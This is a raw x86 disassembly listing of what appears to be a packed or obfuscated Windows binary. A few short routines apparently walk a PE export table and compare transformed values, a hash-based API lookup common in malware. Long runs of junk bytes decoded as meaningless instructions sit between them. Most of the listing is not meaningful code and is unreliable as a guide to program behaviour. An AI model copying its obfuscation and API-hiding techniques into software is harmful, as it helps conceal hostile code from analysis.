  40ae8d:	mov    ebp,0x8cf95917
  40ae92:	out    0x3e,al
  40ae94:	xor    eax,DWORD PTR [edi]
  40ae96:	call   0x3bff:0x31e193af
  40ae9d:	xchg   ebx,eax
  40ae9e:	mov    dl,0xeb
  40aea0:	jno    0x40ae56
  40aea2:	adc    eax,eax
  40aea4:	inc    eax
  40aea5:	inc    edi
  40aea6:	add    DWORD PTR [edi+ebp*8+0x6389fe09],ecx
  40aead:	push   0x4f6d6d1b
  40aeb2:	stc    
  40aeb3:	inc    edx
  40aeb4:	mov    ah,0x88
  40aeb6:	xchg   edi,eax
  40aeb7:	and    eax,0x9e298ce2
  40aebc:	(bad)  
  40aebd:	xor    BYTE PTR [bp+di-0x1d],dh
  40aec1:	sbb    eax,0xad07dd7f
  40aec6:	pop    ebp
  40aec7:	sub    DWORD PTR [eax+edi*2-0x44abfa23],ecx
  40aece:	lock imul edi,esp,0x16629ff6
  40aed5:	rcl    DWORD PTR [ecx+0x0],0xf9
  40aed9:	xchg   esi,eax
  40aeda:	mov    ah,dh
  40aedc:	xchg   BYTE PTR [ebx-0x793897bc],bl
  40aee2:	jg     0x40ae67
  40aee4:	sub    BYTE PTR ds:0x92535e3,bh
  40aeea:	fisttp DWORD PTR [ebx-0x39ccf3b3]
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	aam    0x4c
  40af6b:	sub    eax,0x70ea46cf
  40af70:	jo     0x40af07
  40af72:	jg     0x40afe4
  40af74:	jo     0x40af33
  40af76:	or     esp,DWORD PTR [eax-0x48]
  40af79:	mov    cl,0x83
  40af7b:	ret    0x3434
  40af7e:	out    0xeb,al
  40af80:	or     eax,0x12780b57
  40af85:	pop    edx
  40af86:	jne    0x40afd0
  40af88:	add    dl,BYTE PTR [ebx-0x62]
  40af8b:	mov    esp,0x116e9f0a
  40af90:	inc    ebp
  40af91:	ret    
  40af92:	add    al,0x7a
  40af94:	cmp    eax,DWORD PTR [edi+0x79]
  40af97:	cmp    DWORD PTR [edx],esp
  40af99:	mov    ds:0xd40a4652,eax
  40af9e:	int3   
  40af9f:	cdq    
  40afa0:	call   0x9db0c38f
  40afa5:	mov    esp,0xcb8d16fa
  40afaa:	pop    ebp
  40afab:	mov    ah,0x56
  40afad:	or     eax,0x5db0822f
  40afb2:	rol    BYTE PTR [ebp+eax*4+0x4c],cl
  40afb6:	xor    BYTE PTR [ebp-0x658ecda2],0xa3
  40afbd:	lods   eax,DWORD PTR ds:[esi]
  40afbe:	in     al,dx
  40afbf:	ins    DWORD PTR es:[edi],dx
  40afc0:	jns    0x40afc7
  40afc2:	mov    esi,0x68808aeb
  40afc7:	xor    DWORD PTR [esi+edx*1-0x671c65af],ebp
  40afce:	(bad)  
  40afcf:	jmp    0x40afb5
  40afd1:	sbb    al,0x60
  40afd3:	xlat   BYTE PTR ds:[ebx]
  40afd4:	jnp    0x40b033
  40afd6:	xchg   ecx,eax
  40afd7:	mov    edx,0x470df5ba
  40afdc:	bound  esp,QWORD PTR [esi+0x7304f886]
  40afe2:	repz pop es
  40afe4:	and    eax,0xe751f546
  40afe9:	enter  0x3ca5,0x67
  40afed:	shl    ah,1
  40afef:	mov    edi,0x2632200e
  40aff4:	(bad)  
  40aff5:	aam    0x73
  40aff7:	mov    eax,DWORD PTR [eax+0x16]
  40affa:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40affc:	lock mov al,0xb2
  40afff:	dec    cl
  40b001:	and    DWORD PTR ds:0xa118fcb2,0x614a2469
  40b00b:	mov    DWORD PTR [ebx],edi
  40b00d:	scas   eax,DWORD PTR es:[edi]
  40b00e:	add    al,BYTE PTR [edx+0x42d8a526]
  40b014:	add    esi,DWORD PTR [ebp-0x7bf5acc9]
  40b01a:	mov    ds:0xc4bbb3ae,al
  40b01f:	add    BYTE PTR [eax-0x4ca6b533],0x88
  40b026:	jnp    0x40afe7
  40b028:	cmp    eax,0x8aef12de
  40b02d:	adc    ebp,DWORD PTR [ebx]
  40b02f:	leave  
  40b030:	jnp    0x40b048
  40b032:	out    0x43,eax
  40b034:	cmp    BYTE PTR [ecx+0x24],ah
  40b037:	lahf   
  40b038:	lahf   
  40b039:	test   eax,0x92f07456
  40b03e:	das    
  40b03f:	push   es
  40b040:	adc    DWORD PTR [esi],0xf60acff6
  40b046:	ret    
  40b047:	pop    ebp
  40b048:	scas   al,BYTE PTR es:[edi]
  40b049:	sub    BYTE PTR [ebx-0x12443cb2],bl
  40b04f:	add    DWORD PTR [eax+0x9078d5c],0xa806abda
  40b059:	out    dx,al
  40b05a:	ret    
  40b05b:	pop    ebp
  40b05c:	bound  ebx,QWORD PTR [eax]
  40b05e:	push   edx
  40b05f:	call   DWORD PTR [esi-0x77d9f522]
  40b065:	in     eax,dx
  40b066:	sbb    esp,edx
  40b068:	stos   BYTE PTR es:[edi],al
  40b069:	dec    ebx
  40b06a:	out    dx,eax
  40b06b:	call   0x96df:0x7f7ea5
  40b072:	mov    dl,0x1d
  40b074:	pop    ds
  40b075:	cmp    eax,0xee129a7e
  40b07a:	xor    ebp,DWORD PTR [ecx+0x74]
  40b07d:	adc    BYTE PTR [edi+0x67],dh
  40b080:	push   esp
  40b081:	pop    ss
  40b082:	push   eax
  40b083:	push   cs
  40b084:	push   ecx
  40b085:	out    dx,eax
  40b086:	sti    
  40b087:	arpl   WORD PTR [esi-0x45],di
  40b08a:	mov    ch,0x54
  40b08c:	outs   dx,BYTE PTR ds:[esi]
  40b08d:	into   
  40b08e:	inc    edi
  40b08f:	mov    esi,0x422f5556
  40b094:	mov    dl,0xd2
  40b096:	and    al,0x4c
  40b098:	je     0x40b025
  40b09a:	push   es
  40b09b:	stc    
  40b09c:	adc    eax,0x542f2d29
  40b0a1:	mov    edx,0xa8186810
  40b0a6:	mov    al,0x92
  40b0a8:	xchg   ebp,eax
  40b0a9:	mov    cl,0x2a
  40b0ab:	retf   
  40b0ac:	add    al,0x12
  40b0ae:	mov    cl,0xdb
  40b0b0:	jb     0x40b0bb
  40b0b2:	push   0xffffffc5
  40b0b4:	mov    ebx,0x48497884
  40b0b9:	jecxz  0x40b06c
  40b0bb:	adc    BYTE PTR [edx-0x536a6f0a],al
  40b0c1:	sbb    BYTE PTR [ecx],0x94
  40b0c4:	xlat   BYTE PTR ds:[ebx]
  40b0c5:	jnp    0x40b0c2
  40b0c7:	mov    bh,0x2b
  40b0c9:	imul   eax,DWORD PTR ds:0xa9231d7,0xffffffc4
  40b0d0:	stos   BYTE PTR es:[edi],al
  40b0d1:	sub    eax,0xcc119eaf
  40b0d6:	push   ebp
  40b0d7:	fsub   DWORD PTR [ebx-0x1bcd3084]
  40b0dd:	sbb    ah,cl
  40b0df:	push   eax
  40b0e0:	repz add ebp,esp
  40b0e3:	xchg   DWORD PTR [edi],esi
  40b0e5:	std    
  40b0e6:	xor    DWORD PTR [edx],ebx
  40b0e8:	fild   QWORD PTR [ecx+0x73]
  40b0eb:	stos   BYTE PTR es:[edi],al
  40b0ec:	ins    DWORD PTR es:[edi],dx
  40b0ed:	shl    DWORD PTR [edi],0x80
  40b0f0:	and    esp,0xc88375ab
  40b0f6:	stos   DWORD PTR es:[edi],eax
  40b0f7:	shl    DWORD PTR [edx+0x38],1
  40b0fa:	cmp    al,BYTE PTR [eax+0x7fd94bce]
  40b100:	ffree  st(4)
  40b102:	retf   0x262d
  40b105:	out    dx,eax
  40b106:	mov    ebp,0xaf6cfe6
  40b10b:	mov    edi,0xb5e22c98
  40b110:	mov    ecx,DWORD PTR [ebp-0x18]
  40b113:	mov    eax,DWORD PTR [ebp-0x8]
  40b116:	mov    eax,DWORD PTR [eax]
  40b118:	mov    eax,DWORD PTR [eax+0x3c]
  40b11b:	lea    ecx,[ecx*8+0x78]
  40b122:	add    eax,ecx
  40b124:	mov    ecx,DWORD PTR [ebp-0x8]
  40b127:	mov    ecx,DWORD PTR [ecx]
  40b129:	mov    eax,DWORD PTR [eax+ecx*1]
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	jge    0x40b0e6
  40b149:	ret    0xdb79
  40b14c:	call   0x7fd621c1
  40b151:	jo     0x40b1c3
  40b153:	mov    ebx,0x76d02afa
  40b158:	lods   eax,DWORD PTR ds:[esi]
  40b159:	jg     0x40b1c5
  40b15b:	xor    BYTE PTR [ecx],bh
  40b15d:	push   ecx
  40b15e:	jmp    0xfcc2:0x9b8c013d
  40b165:	out    0x6b,eax
  40b167:	adc    ecx,ebp
  40b169:	mov    bh,0x34
  40b16b:	(bad)  
  40b16c:	jbe    0x40b139
  40b16e:	stos   BYTE PTR es:[edi],al
  40b16f:	xchg   ebx,eax
  40b170:	lahf   
  40b171:	sbb    DWORD PTR [edi+edi*8],ebx
  40b174:	pop    ebx
  40b175:	and    BYTE PTR [edi],cl
  40b177:	ja     0x40b1e6
  40b179:	test   BYTE PTR [ecx+0x4c],ch
  40b17c:	repnz imul esi,DWORD PTR [edx],0x35232d3b
  40b183:	(bad)  
  40b184:	adc    eax,DWORD PTR [ecx]
  40b186:	test   al,0x86
  40b188:	(bad)  
  40b189:	int3   
  40b18a:	js     0x40b183
  40b18c:	mov    esi,0xc04d3c09
  40b191:	push   edx
  40b192:	loopne 0x40b127
  40b194:	arpl   WORD PTR [ebx+ecx*1+0x4a1343c5],ax
  40b19b:	sbb    bl,BYTE PTR [esi]
  40b19d:	mov    ah,0x46
  40b19f:	jecxz  0x40b20a
  40b1a1:	sbb    bl,0xe5
  40b1a4:	mov    edi,0x37329c35
  40b1a9:	mov    dl,0xd0
  40b1ab:	test   BYTE PTR [ebx],0x30
  40b1ae:	ins    DWORD PTR es:[edi],dx
  40b1af:	aad    0x84
  40b1b1:	pop    ds
  40b1b2:	cmp    BYTE PTR [esp+eiz*8-0x53d3a928],0x1d
  40b1ba:	xor    DWORD PTR [ebp-0x34],edx
  40b1bd:	jmp    0x4a1c67dd
  40b1c2:	sbb    al,0xa5
  40b1c4:	cdq    
  40b1c5:	and    eax,0x22e4eed5
  40b1ca:	cld    
  40b1cb:	shl    BYTE PTR [ebx+0x3f01537b],cl
  40b1d1:	mov    dh,0x1d
  40b1d3:	mov    al,ds:0x1b6fda89
  40b1d8:	in     al,dx
  40b1d9:	sbb    DWORD PTR [edx+0x1e92a298],ebp
  40b1df:	les    esp,FWORD PTR [ecx]
  40b1e1:	cmp    DWORD PTR [edi+0x5187c646],edx
  40b1e7:	cmp    BYTE PTR [ebx-0x4b],ah
  40b1ea:	adc    eax,0x2f452900
  40b1ef:	call   0xcdf4521c
  40b1f4:	dec    ebp
  40b1f5:	jae    0x40b1fe
  40b1f7:	pop    ecx
  40b1f8:	pushf  
  40b1f9:	cdq    
  40b1fa:	push   es
  40b1fb:	xchg   DWORD PTR [eax+0x18],esp
  40b1fe:	test   al,0xe1
  40b200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b202:	inc    edx
  40b203:	ret    
  40b204:	xchg   edx,eax
  40b205:	dec    eax
  40b206:	xchg   ebp,eax
  40b207:	loope  0x40b192
  40b209:	stc    
  40b20a:	xor    dh,BYTE PTR [ebp+0x4443c111]
  40b210:	mov    BYTE PTR [edi-0x5e],dh
  40b213:	in     eax,dx
  40b214:	add    ecx,eax
  40b216:	sub    eax,DWORD PTR [ebx+0x19e40cd2]
  40b21c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b21d:	add    edi,DWORD PTR [esi+0x67]
  40b220:	or     cl,0x1b
  40b223:	out    0x2a,eax
  40b225:	push   ebx
  40b226:	jmp    0x1cb6d2ae
  40b22b:	ins    BYTE PTR es:[edi],dx
  40b22c:	mov    edx,0x90ebd725
  40b231:	add    DWORD PTR [edi+0x6b],edi
  40b234:	sub    DWORD PTR [eax+ebx*4+0x781066a1],ebx
  40b23b:	call   0xfdc812c8
  40b240:	loope  0x40b2bd
  40b242:	inc    eax
  40b243:	pop    eax
  40b244:	es aaa 
  40b246:	sbb    eax,DWORD PTR [edi]
  40b248:	xchg   esi,eax
  40b249:	ret    0x8ed2
  40b24c:	hlt    
  40b24d:	cmc    
  40b24e:	and    al,0xd7
  40b250:	xchg   al,cl
  40b252:	iret   
  40b253:	lahf   
  40b254:	(bad)  
  40b256:	stc    
  40b257:	dec    edi
  40b258:	cmp    ah,0x98
  40b25b:	aam    0xe9
  40b25d:	jge    0x40b1e4
  40b25f:	fwait
  40b260:	sbb    dl,BYTE PTR [esi+0x22]
  40b263:	inc    esi
  40b264:	xchg   ebx,eax
  40b265:	and    esi,DWORD PTR [ebp+0x2d5d05be]
  40b26b:	xchg   DWORD PTR [eax+ebp*4+0x7b],ebx
  40b26f:	sub    bh,0x7d
  40b272:	xor    bh,dl
  40b274:	retf   0x6a8d
  40b277:	push   0x1a
  40b279:	bound  edx,QWORD PTR [ebx-0x6a8a8f6f]
  40b27f:	aaa    
  40b280:	jns    0x40b2ca
  40b282:	(bad)  
  40b283:	cmp    eax,0xa74718e3
  40b288:	xor    al,0x3d
  40b28a:	jo     0x40b2a9
  40b28c:	loope  0x40b303
  40b28e:	jmp    FWORD PTR [ecx+ebp*4]
  40b291:	and    al,ch
  40b293:	mov    esi,0x2dbeeb0a
  40b298:	pushf  
  40b299:	imul   edx,DWORD PTR [edx+0x15908a1e],0x56a7e8ef
  40b2a3:	jae    0x40b23d
  40b2a5:	cmc    
  40b2a6:	mov    bl,0x0
  40b2a8:	and    DWORD PTR [ecx],edx
  40b2aa:	xlat   BYTE PTR ds:[ebx]
  40b2ab:	loopne 0x40b309
  40b2ad:	mov    ch,0x8e
  40b2af:	jne    0x40b2ab
  40b2b1:	or     al,0x20
  40b2b3:	frstor [esi+0x5f1d2b0e]
  40b2b9:	std    
  40b2ba:	cli    
  40b2bb:	add    BYTE PTR [ecx-0x3ae8659a],0x30
  40b2c2:	in     al,dx
  40b2c3:	pop    edx
  40b2c4:	and    al,0x1a
  40b2c6:	in     eax,dx
  40b2c7:	repnz imul edi,DWORD PTR [ebx-0x5b],0x53
  40b2cc:	mov    ecx,0x3ea3259a
  40b2d1:	jns    0x40b2cc
  40b2d3:	cld    
  40b2d4:	rol    BYTE PTR [edx],0x3d
  40b2d7:	fidivr DWORD PTR [ebx+0x6121462a]
  40b2dd:	push   ebx
  40b2de:	leave  
  40b2df:	shl    BYTE PTR [eax],1
  40b2e1:	inc    eax
  40b2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e3:	or     bl,BYTE PTR [bx+0xf]
  40b2e7:	in     al,dx
  40b2e8:	inc    esp
  40b2e9:	jmp    0x40b297
  40b2eb:	pop    es
  40b2ec:	scas   eax,DWORD PTR es:[edi]
  40b2ed:	inc    eax
  40b2ee:	mov    DWORD PTR [ebp-0x24],eax
  40b2f1:	jmp    0x40b4a9
  40b2f6:	mov    cl,0x4
  40b2f8:	icebp  
  40b2f9:	in     al,0x71
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0xafdbadc9
  40b303:	push   ds
  40b304:	xchg   ebx,edx
  40b306:	jo     0x40b2fe
  40b308:	jo     0x40b37a
  40b30a:	xchg   ebp,eax
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b31d
  40b30f:	add    DWORD PTR [edx],edi
  40b311:	lds    edx,FWORD PTR [ebx]
  40b313:	cmp    ecx,DWORD PTR [ebx-0x3106159f]
  40b319:	ins    BYTE PTR es:[edi],dx
  40b31a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b31b:	daa    
  40b31c:	xor    bh,BYTE PTR [ecx+0x4f01b1d3]
  40b322:	sub    BYTE PTR [eax+0x37789777],0x56
  40b329:	outs   dx,BYTE PTR ds:[esi]
  40b32a:	test   al,0x98
  40b32c:	or     cl,bh
  40b32e:	ins    BYTE PTR es:[edi],dx
  40b32f:	xchg   ebp,eax
  40b330:	mov    edx,0x79b2fca5
  40b335:	xchg   BYTE PTR [ecx*2+0x2410551a],ah
  40b33c:	pop    edx
  40b33d:	and    ah,BYTE PTR [edx+0x514de41a]
  40b343:	jecxz  0x40b3ad
  40b345:	stos   BYTE PTR es:[edi],al
  40b346:	sbb    BYTE PTR [edx],0xb8
  40b349:	sub    edi,DWORD PTR [eax]
  40b34b:	inc    edi
  40b34c:	pop    DWORD PTR [ebp+0x3eb9b1fc]
  40b352:	imul   esp,DWORD PTR [ebx+0x1b0eca0d],0xffffffae
  40b359:	int    0xe5
  40b35b:	pop    es
  40b35c:	mov    ax,0x3d28
  40b360:	das    
  40b361:	cmp    ch,BYTE PTR [eax]
  40b363:	dec    edx
  40b364:	test   al,0x51
  40b366:	(bad)  
  40b367:	push   es
  40b368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b369:	stos   DWORD PTR es:[edi],eax
  40b36a:	push   eax
  40b36b:	sbb    dh,ah
  40b36d:	test   al,0x61
  40b36f:	mov    ds,WORD PTR [ecx+0x29]
  40b372:	ret    
  40b373:	clc    
  40b374:	pop    edi
  40b375:	test   eax,0x42219b14
  40b37a:	mov    esp,0xac22b4ec
  40b37f:	adc    eax,0xb763fc93
  40b384:	dec    eax
  40b385:	aaa    
  40b386:	mov    BYTE PTR [esi-0x413d9e0f],al
  40b38c:	rol    esp,0x3
  40b38f:	and    BYTE PTR [ecx],ch
  40b391:	leave  
  40b392:	scas   eax,DWORD PTR es:[edi]
  40b393:	inc    ecx
  40b394:	outs   dx,BYTE PTR ds:[esi]
  40b395:	push   esi
  40b396:	jo     0x40b414
  40b398:	mov    eax,0xe40c4203
  40b39d:	jmp    0x33a00bf0
  40b3a2:	push   edx
  40b3a3:	pop    ecx
  40b3a4:	ror    BYTE PTR [eax],cl
  40b3a6:	enter  0xe90e,0x3c
  40b3aa:	and    eax,0xf4eeb79f
  40b3af:	test   DWORD PTR [ecx+0x52c8235f],ecx
  40b3b5:	mov    DWORD PTR [ecx],0x47505ee9
  40b3bb:	add    DWORD PTR [eax-0x75a82ec4],edx
  40b3c1:	(bad)  
  40b3c2:	aad    0xa4
  40b3c4:	stc    
  40b3c5:	pop    ebp
  40b3c6:	or     esi,DWORD PTR [esi+0x6c380d96]
  40b3cc:	(bad)  
  40b3cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3ce:	scas   al,BYTE PTR es:[edi]
  40b3cf:	fbstp  TBYTE PTR [ecx]
  40b3d1:	into   
  40b3d2:	push   ecx
  40b3d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3d4:	sti    
  40b3d5:	(bad)  
  40b3d6:	std    
  40b3d7:	add    DWORD PTR [eax],0xffffffbd
  40b3da:	bswap  esi
  40b3dc:	(bad)  
  40b3dd:	sbb    al,bl
  40b3df:	(bad)  
  40b3e1:	and    DWORD PTR [ecx],esi
  40b3e3:	out    0xe9,al
  40b3e5:	and    BYTE PTR [esi-0x7da0bb6d],bh
  40b3eb:	push   eax
  40b3ec:	cmp    DWORD PTR [esi],0xa50ecda4
  40b3f2:	push   esi
  40b3f3:	cs mov esp,0xc9eb610c
  40b3f9:	repnz cmp ah,BYTE PTR gs:[ebx]
  40b3fd:	push   ecx
  40b3fe:	fdivr  DWORD PTR [edi+0x2b]
  40b401:	bound  esi,QWORD PTR [edx]
  40b403:	frstor [edi+eiz*4]
  40b406:	adc    eax,DWORD PTR [eax+0x5f7b0690]
  40b40c:	rol    DWORD PTR [edi+0x20511897],cl
  40b412:	inc    edx
  40b413:	adc    BYTE PTR [edx+0x2e],0x5e
  40b417:	push   ebx
  40b418:	add    bh,dh
  40b41a:	and    BYTE PTR [eax-0x6fffb841],cl
  40b420:	push   edx
  40b421:	cli    
  40b422:	adc    al,ch
  40b424:	fcom   DWORD PTR [esp+eiz*4]
  40b427:	std    
  40b428:	xor    al,0x3a
  40b42a:	jns    0x40b478
  40b42c:	push   ebx
  40b42d:	cmp    al,0x54
  40b42f:	xor    BYTE PTR [ecx+ebp*1-0x47],dh
  40b433:	aam    0x47
  40b435:	or     esi,esi
  40b437:	or     DWORD PTR [ebp-0x4],edi
  40b43a:	ja     0x40b4a3
  40b43c:	push   edx
  40b43d:	pop    ebx
  40b43e:	pop    esi
  40b43f:	inc    eax
  40b440:	sub    dh,BYTE PTR [ecx-0x5cdd3147]
  40b446:	jge    0x40b4ab
  40b448:	sahf   
  40b449:	pop    ebp
  40b44a:	mov    ch,0x3c
  40b44c:	in     al,0xa0
  40b44e:	xlat   BYTE PTR ds:[ebx]
  40b44f:	fldcw  WORD PTR [esi]
  40b451:	push   ebx
  40b452:	rcl    BYTE PTR [eax],1
  40b454:	call   0xc32c:0x6016012
  40b45b:	mov    bh,BYTE PTR [edx]
  40b45d:	push   ecx
  40b45e:	mov    bh,0x4d
  40b460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b461:	daa    
  40b462:	sbb    ebp,DWORD PTR ds:0xeadb119
  40b468:	rcl    BYTE PTR [ebx+0x41],cl
  40b46b:	mov    al,ds:0xb18d5c6
  40b470:	cmp    eax,0xf1fcbb64
  40b475:	es push ds
  40b477:	rol    BYTE PTR [esi-0x6],0x83
  40b47b:	call   0x80f0559c
  40b480:	or     ebp,ebx
  40b482:	mov    ch,al
  40b484:	push   ss
  40b485:	jmp    0x4e80a23a
  40b48a:	cwde   
  40b48b:	ds arpl si,bp
  40b48e:	lods   al,BYTE PTR ds:[esi]
  40b48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b490:	add    cl,0x58
  40b493:	lea    ebp,[ebp-0x2b]
  40b496:	retf   0x1e1f
  40b499:	mov    al,0xbc
  40b49b:	popf   
  40b49c:	inc    ebx
  40b49d:	sti    
  40b49e:	div    BYTE PTR [edi+0x3e]
  40b4a1:	imul   DWORD PTR [ebx]
  40b4a3:	jl     0x40b500
  40b4a5:	add    al,0x88
  40b4a7:	inc    edi
  40b4a8:	or     BYTE PTR [ebx+0x4d8b0845],0xe0
  40b4af:	xor    eax,esi
  40b4b1:	add    eax,edi
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0xc6413075
  40b4de:	pop    edi
  40b4df:	mov    dl,0x6
  40b4e1:	xchg   ebp,eax
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b4e6
  40b4ea:	xchg   esp,eax
  40b4eb:	cmp    ebp,esp
  40b4ed:	scas   al,BYTE PTR es:[edi]
  40b4ee:	out    0xf3,al
  40b4f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4f1:	jnp    0x40b54a
  40b4f3:	inc    ebp
  40b4f4:	sahf   
  40b4f5:	jno    0x40b50b
  40b4f7:	dec    ebp
  40b4f8:	jno    0x40b521
  40b4fa:	fistp  DWORD PTR [esi+0x3a]
  40b4fd:	sbb    al,0x3f
  40b4ff:	lds    edi,FWORD PTR [eax+0x788723e8]
  40b505:	scas   al,BYTE PTR es:[edi]
  40b506:	jge    0x40b509
  40b508:	mov    BYTE PTR [edi+0x25],dl
  40b50b:	pop    esi
  40b50c:	mov    eax,0x5d076f9b
  40b511:	repnz and ebx,edx
  40b514:	sbb    cl,dl
  40b516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b517:	push   ss
  40b518:	ins    BYTE PTR es:[edi],dx
  40b519:	loopne 0x40b555
  40b51b:	stos   BYTE PTR es:[edi],al
  40b51c:	jae    0x40b575
  40b51e:	out    dx,al
  40b51f:	xlat   BYTE PTR ds:[ebx]
  40b520:	in     eax,0x68
  40b522:	daa    
  40b523:	sti    
  40b524:	add    DWORD PTR [edi],esp
  40b526:	add    eax,0x38392d06
  40b52b:	or     al,0xa
  40b52d:	popa   
  40b52e:	pop    eax
  40b52f:	mov    cl,0x80
  40b531:	int3   
  40b532:	pop    edx
  40b533:	or     BYTE PTR [edx+edi*4-0xd],cl
  40b537:	stos   BYTE PTR es:[edi],al
  40b538:	scas   al,BYTE PTR es:[edi]
  40b539:	mov    DWORD PTR [eax],esp
  40b53b:	stc    
  40b53c:	stos   BYTE PTR es:[edi],al
  40b53d:	rcl    BYTE PTR [esp+edi*8-0x21],1
  40b541:	cmp    ebp,DWORD PTR [esi]
  40b543:	jmp    0x40b506
  40b545:	xchg   ebx,eax
  40b546:	fcomip st,st(3)
  40b548:	xchg   edi,eax
  40b549:	shl    ebx,0x90
  40b54c:	dec    edx
  40b54d:	icebp  
  40b54e:	das    
  40b54f:	loopne 0x40b4d9
  40b551:	xchg   ebx,eax
  40b552:	retf   
  40b553:	in     al,dx
  40b554:	push   ds
  40b555:	mov    esp,0x681c97c9
  40b55a:	fwait
  40b55b:	sub    ebx,DWORD PTR [esi+ebx*2+0x32b8737e]
  40b562:	cdq    
  40b563:	in     eax,0xb
  40b565:	jle    0x40b51b
  40b567:	lahf   
  40b568:	jnp    0x40b585
  40b56a:	in     eax,0xca
  40b56c:	arpl   WORD PTR [eax-0x33],dx
  40b56f:	push   ebx
  40b570:	das    
  40b571:	aad    0x52
  40b573:	js     0x40b516
  40b575:	sub    BYTE PTR [eax+0x2271c203],al
  40b57b:	or     al,0x3f
  40b57d:	pop    edx
  40b57e:	mov    WORD PTR [ecx+0x5c],ss
  40b581:	div    eax
  40b583:	into   
  40b584:	push   0x41d9076c
  40b589:	mov    esi,0x8cecbcde
  40b58e:	sahf   
  40b58f:	retf   
  40b590:	pop    es
  40b591:	mov    bh,0xd3
  40b593:	pop    ecx
  40b594:	shr    DWORD PTR [edi],cl
  40b596:	mov    al,0x9d
  40b598:	out    dx,al
  40b599:	pop    edx
  40b59a:	or     edx,esp
  40b59c:	push   ds
  40b59d:	nop
  40b59e:	push   ecx
  40b59f:	dec    eax
  40b5a0:	or     bl,dl
  40b5a2:	sbb    al,0xf9
  40b5a4:	fwait
  40b5a5:	dec    edx
  40b5a6:	and    eax,0xa4998e38
  40b5ab:	pop    edx
  40b5ac:	xchg   DWORD PTR [eax],ebx
  40b5ae:	xlat   BYTE PTR ds:[ebx]
  40b5af:	test   al,0xd
  40b5b1:	adc    eax,0x6f323996
  40b5b6:	call   0x2fbfa5df
  40b5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5bc:	inc    esi
  40b5bd:	out    dx,al
  40b5be:	sbb    DWORD PTR [edi-0x75],eax
  40b5c1:	push   ds
  40b5c2:	call   0xf3ff90d9
  40b5c7:	cwde   
  40b5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5c9:	punpcklbw mm3,DWORD PTR ds:0xeb218aa
  40b5d0:	sub    BYTE PTR [ecx+0x57],dl
  40b5d3:	mov    edi,0x2d42a9af
  40b5d8:	cmc    
  40b5d9:	dec    ebx
  40b5da:	dec    ebx
  40b5db:	sub    DWORD PTR [edi-0x76],ebx
  40b5de:	imul   BYTE PTR [edi+eax*8+0x7afd6140]
  40b5e5:	test   BYTE PTR [eax],cl
  40b5e7:	sahf   
  40b5e8:	xchg   DWORD PTR [ebx+0x117d85a3],ecx
  40b5ee:	pop    esi
  40b5ef:	into   
  40b5f0:	call   0xbcf4:0xe132d0ea
  40b5f7:	int    0x11
  40b5f9:	push   ebx
  40b5fa:	and    esp,ebx
